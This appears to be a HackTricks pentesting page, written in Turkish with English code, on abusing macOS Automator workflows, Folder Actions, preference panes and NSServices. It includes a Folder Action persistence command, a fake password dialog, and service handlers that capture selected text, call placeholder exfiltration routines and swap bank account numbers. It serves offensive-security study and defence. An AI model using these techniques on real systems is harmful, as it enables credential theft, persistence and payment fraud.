# macOS Automator, Preference Panes & NSServices İstismarı

{{#include ../../../banners/hacktricks-training.md}}

## Automator Actions & İş Akışları

### Temel Bilgiler

**Automator** macOS'un görsel otomasyon aracıdır. Çalıştırdığı **iş akışları** (`.workflow` paketleri), **eylemler** (`.action` paketleri) ile oluşturulur. Automator ayrıca **Folder Actions**, **Quick Actions** ve **Shortcuts** entegrasyonunu da sağlar.

Automator eylemleri, bir iş akışı çalıştığında Automator çalışma zamanına yüklenen **eklenti**lerdir. Şunları yapabilirler:
- Herhangi bir shell script'i çalıştırmak
- Dosya ve verileri işlemek
- AppleScript aracılığıyla uygulamalarla etkileşim kurmak
- Karmaşık otomasyonlar için birbirine zincirleyerek kullanılmak

### Neden Önemli

> [!WARNING]
> Automator iş akışları **sosyal mühendislik** ile çalıştırılacak şekilde kandırılabilir — basit belge dosyaları gibi görünürler. Bir `.workflow` paketi, iş akışı çalıştığında yürütülen gömülü shell komutları içerebilir. Folder Actions ile birleştiğinde, dosya olaylarında tetiklenen **otomatik kalıcılık** sağlarlar.

### Keşif
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### Attack: Social-Engineered Workflow

Çoğu kullanıcı için bir `.workflow` paketi normal bir belge dosyası gibi görünür:
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Attack: Folder Action Persistence

Folder Actions, izlenen bir klasöre dosyalar eklendiğinde otomatik olarak bir workflow (iş akışı) çalıştırır:
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions yeniden başlatmalarda kalıcıdır ve sessizce çalışır. `~/Downloads` üzerinde bir Folder Action, **indirilen her dosyanın payload'unuzu tetikleyeceği** anlamına gelir — Safari, Chrome, AirDrop ve e‑posta ekleri dahil.

---

## Tercih Panelleri

### Temel Bilgiler

Preference panes (`.prefPane` bundles) System Settings'e yüklenen eklentilerdir (eski adı System Preferences). Sistem veya üçüncü taraf özellikler için yapılandırma UI panelleri sağlarlar.

### Neden Önemli

- Preference panes **System Settings süreci** içinde çalışır; bu süreçte **yükseltilmiş TCC izinleri** (accessibility, bazı bağlamlarda full disk access) olabilir
- Üçüncü taraf preference panes bu güvenilir sürece yüklenir ve **güvenlik bağlamını devralır**
- Kullanıcılar preference panes'i **çift tıklayarak** kurar — kolay sosyal mühendislik
- Kurulduktan sonra, **kalıcı olurlar** ve System Settings o panele her açıldığında yüklenir

### Keşif
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Saldırı: Privilege Context Hijacking

Kötü amaçlı bir tercih paneli, System Settings'in güvenlik bağlamını devralır:
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside System Settings process
// It has System Settings' TCC permissions

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### Saldırı: Persistence via Installation
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### Saldırı: UI Phishing

Bir tercih paneli meşru sistem UI panellerini taklit ederek **phish for credentials** yapabilir:
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### Temel Bilgiler

**NSServices** uygulamaların diğer uygulamalara işlevsellik sağlamasına izin verir; **Hizmetler menüsü** aracılığıyla (sağ tık → Hizmetler). Bir kullanıcı metin veya veri seçip bir hizmeti çağırdığında, seçilen veri işlenmek üzere **hizmet sağlayıcıya gönderilir**.

Hizmetler bir uygulamanın `Info.plist` dosyasında `NSServices` anahtarı altında beyan edilir ve pasteboard sunucusuna (`pbs`) kaydedilir.

### Neden Bu Önemli

- Hizmetler **uygulamalar arası veri akışı** alır — herhangi bir uygulamadan seçilen metin hizmete gönderilir
- Kötü amaçlı bir hizmet parola yöneticilerinden, e-posta istemcilerinden, finansal uygulamalardan veri ele geçirebilir
- Hizmetler çağıran uygulamaya **değiştirilmiş veri döndürebilir** (seçim işlemlerinde man-in-the-middle)
- Hizmet isimleri meşru görünmesi için kurgulanabilir ("Format Text", "Encrypt Selection", "Share")

### Keşif
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### Saldırı: Data Interception Service
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### Saldırı: Veri Değiştirme (Man-in-the-Middle)

Bir servis, meşru bir işlev sağlıyormuş gibi görünürken **geri döndürülen verileri değiştirebilir**:
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
---

## Çapraz-Teknik Saldırı Zincirleri

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### Tercih Paneli → TCC Yetki Yükseltmesi
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane runs inside System Settings context
4. Inherits System Settings' TCC grants
5. Access protected data, control other apps via inherited Accessibility
```
### NSService → Parola Yöneticisi Hırsızlığı
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## Referanslar

* [Apple Developer — Automator Programming Guide](https://developer.apple.com/library/archive/documentation/AppleApplications/Conceptual/AutomatorConcepts/Automator.html)
* [Apple Developer — Preference Pane Programming Guide](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/PreferencePanes/Introduction/Introduction.html)
* [Apple Developer — Services Implementation Guide](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/SysServices/introduction.html)
* [Objective-See — Folder Action Persistence](https://objective-see.org/blog.html)

{{#include ../../../banners/hacktricks-training.md}}
